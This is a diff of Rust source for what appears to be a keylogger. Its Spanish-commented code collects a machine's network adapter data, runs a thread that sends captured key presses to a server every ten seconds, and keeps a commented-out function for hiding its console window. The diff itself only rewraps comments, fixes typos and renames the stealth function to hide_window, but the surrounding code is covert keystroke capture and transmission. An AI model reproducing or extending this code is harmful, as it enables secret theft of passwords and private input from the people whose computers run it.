@@ -287,18 +287,21 @@ fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
     // se obtiene la cantidad de adaptadores en la computadora
     let mut network_adapters_size =
         (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
-    // el arreglo se llena con los adaptadores de red de la computadora
+    // el arreglo se llena con los adaptadores de red de la 
+    // computadora
     unsafe { GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size) };
     // se devuelve las direcciones mac de los adaptadores de red de la computadora
     network_adapters
         .iter()
         .filter_map(|adapter| {
-            // se determina si la dirección mac del adaptador es difernte al predeterminado
-            // recordar que el arreglo se inicializó con 16 elementos que por predeterminado
+            // se determina si la dirección mac del adaptador es difernte 
+            // al predeterminado
+            // recordar que el arreglo se inicializó con 16 elementos que por 
+            // predeterminado
             // tienen en la dirección mac puros ceros
             let has_address = !adapter.Address.iter().all(|address| *address == 0);
-            // si no está lleno de ceros (osea hay una dirección mac) entonces retornar
-            // un Some para la filtración
+            // si no está lleno de ceros (osea hay una dirección mac) 
+            // entonces retornar un Some para la filtración
             has_address.then(|| adapter.IpAddressList.IpAddress.String)
         })
         .collect()
@@ -324,7 +327,7 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
     // duración del tiempo entre envios de las teclas presionadas
     // al servidor
     let sending_duration = Duration::from_secs(10);
-    // duración del tiempo entre re intento de enviar información
+    // duración del tiempo entre re-intento de enviar información
     // al servidor en caso haya una falla en la conexión
     let retry_response_duration = Duration::from_secs(10);
     // se inicializa un cliente http
@@ -333,7 +336,7 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
     // al servidor
     loop {
         // pausar el hilo hasta el tiempo determinado para
-        // enviar la informació nal servidor
+        // enviar la información al servidor
         std::thread::sleep(sending_duration);
         // se inicializa un arreglo para almacenar las teclas
         // presionadas
@@ -455,7 +458,7 @@ async fn main() {
     }
 }
 
-// fn stealth() {
+// fn hide_window() {
 //     let mut stealth: winapi::shared::windef::HWND;
 //     unsafe {
 //         winapi::um::consoleapi::AllocConsole();
